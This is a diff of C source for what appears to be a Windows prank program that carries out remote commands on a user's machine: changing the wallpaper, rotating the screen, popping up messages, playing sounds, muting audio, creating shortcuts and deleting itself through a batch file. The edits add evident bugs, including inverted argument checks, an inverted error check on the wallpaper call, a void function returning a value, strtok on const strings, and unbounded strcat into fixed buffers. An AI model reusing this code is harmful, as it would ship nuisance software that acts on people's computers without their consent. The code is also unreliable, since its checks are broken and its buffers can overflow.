@@ -1,8 +1,8 @@
 #include "Funnies.h"
 #include "Link.h"
 
-WINBOOL changeWallpaper(char *img) {
-    if(!img) {
+void changeWallpaper(const char *img) {
+    if(!img[0]) {
         JBlogErr("Not enough arguments");
         return 0;
     }
@@ -10,7 +10,8 @@ WINBOOL changeWallpaper(char *img) {
     char path[MAX_PATH] = "res\\";
     strcat(path, img);
 
-    return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
+    if(SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE))
+        JBlogErr("Could not change wallpaper");
 }
 /*
 Use DMDO_X macro or number between 0 - 3 (inclusive)
@@ -26,14 +27,14 @@ LONG ChangeRotation(DWORD Orient) {
     if (mode.dmFields | DM_DISPLAYORIENTATION)
     {
         mode.dmDisplayOrientation = Orient;
-        return ChangeDisplaySettings(&mode, 0);
+        return ChangeDisplaySettingsW(&mode, 0);
     }
     return -1;
 }
 
 
 void openLink(const char *site) {
-    if(!site) {
+    if(!site[0]) {
         JBlogErr("Not enough arguments");
         return;
     }
@@ -47,8 +48,25 @@ void openLink(const char *site) {
 const char *PCName;
 static char wallpaper[MAX_PATH] = BADPATH;
 
+void play(const char *src) {
+    if (!src[0] == 0) {
+        JBlogErr("Not enough arguments");
+        return;
+    }
+    
+    char path[CMD_ARGSZ] = "res\\";
+    strcat(path, src);
 
-void popupW(char *argz) {
+    if(!PlaySoundA(path, NULL, SND_FILENAME | SND_ASYNC)) 
+        JBlogErr("Could not play audio");
+}
+
+void popupW(const char *argz) {
+    if (!argz[0] == 0) {
+        JBlogErr("Not enough arguments");
+        return;
+    }
+
     wchar_t wargz[CMD_ARGSZ];
     MultiByteToWideChar(CP_UTF8, 0, argz, -1, wargz, CMD_ARGSZ); // turn argz to wchar and put it in wargz
     
@@ -75,26 +93,22 @@ void popupW(char *argz) {
     MultiByteToWideChar(CP_UTF8, 0, _arg2, -1, arg2, two);
 #endif
 
-    if(!arg1) {
-        JBlog("Not enough arguments");
-        return;
-    }
-
     MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0);
 }
 
 
-void popupA(char *argz) {
-    char *arg1 = strtok(argz, SEP);
-    char *arg2 = strtok(NULL, SEP);
-    
-    if(!arg1) {
+void popupA(const char *argz) {
+    if(!argz[0]) {
         JBlogErr("Not enough arguments");
         return;
     }
 
+    char *arg1 = strtok(argz, SEP);
+    char *arg2 = strtok(NULL, SEP);
+
     MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0);
 }
+
 
 void execCommand(JBCMD cmd)
 {
@@ -119,6 +133,7 @@ void execCommand(JBCMD cmd)
         break;
     case JB_REMOVE:
         // you should uninstall yourself NOW!!!
+        JBlog("Killing myself rn...");
         system("start /min /high kys.bat");
         exit(0); // just in case
         break;
@@ -130,9 +145,7 @@ void execCommand(JBCMD cmd)
     case JB_MUTE:
         SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_DOWN);
     case JB_SZAMBO: // it has to be a .wav file
-        char path[CMD_ARGSZ] = "res\\";
-        strcat(path, cmd.args);
-        PlaySoundA(path, NULL, SND_FILENAME | SND_ASYNC);
+        play(cmd.args);
         break;
 
     /* --- Wallpaper --- */
@@ -152,7 +165,7 @@ void execCommand(JBCMD cmd)
 
     /* --- Shortcuts --- */
     case JB_LINKMAKE:
-        CreateLinks(cmd.args ? atoi(cmd.args) : 100);
+        CreateLinks(atoi(cmd.args));
         break;
     case JB_LINKDEL:
         RemoveLinks();
@@ -185,12 +198,10 @@ void execCommand(JBCMD cmd)
         break;
 
     default:
-        char msg[CMD_ARGSZ] = "Unknown command - ";
-        char uc[64];
-        itoa(cmd.cmd, uc, 10);
-        strcat(msg, uc);
-
-        JBlogErr(msg);
+        JBlogErr("\\/Unknown command\\/");
+        char c[CMD_ARGSZ];
+        itoa(cmd.cmd, c, 10);
+        JBlog(c);
         break;
     }
 }
